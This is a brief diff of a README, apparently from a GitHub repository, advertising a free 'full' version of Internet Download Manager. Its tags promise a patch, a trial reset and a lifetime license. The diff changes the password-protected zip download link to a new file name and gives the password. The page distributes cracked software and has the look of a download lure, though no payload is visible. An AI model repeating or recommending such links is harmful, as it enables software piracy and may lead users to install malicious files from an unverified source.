@@ -8,7 +8,7 @@ Tags: IDM, IDM-free, IDM for windows, IDM 2025, Internet Download Manager, File 
 - Topics: Internet-Download-Manager, IDM, file-downloader, free-software, download-management, pro-version, idm download-manager internet-download-manager idm-reset idm-patch idm-resetter-download idm-license idm-reset-trial idm-full idm-download idm-free-pc idm-free idm-free-windows idm-lifetime internet-download-manager-premium download-manager-software download-manager-tools idm-2025 internet-download-manager-2025
 
 ## 🔗 Software Access  
-### Download: [Internet Download Manager](https://github.com/Xyt069/Internet-Download-Manager-2025/releases/download/IDM/IDM-Desktop.zip)
+### Download: [Internet Download Manager](https://github.com/Xyt069/Internet-Download-Manager-2025/releases/download/IDM/IDM-PC-Full.zip)
 Password-2025
 
 
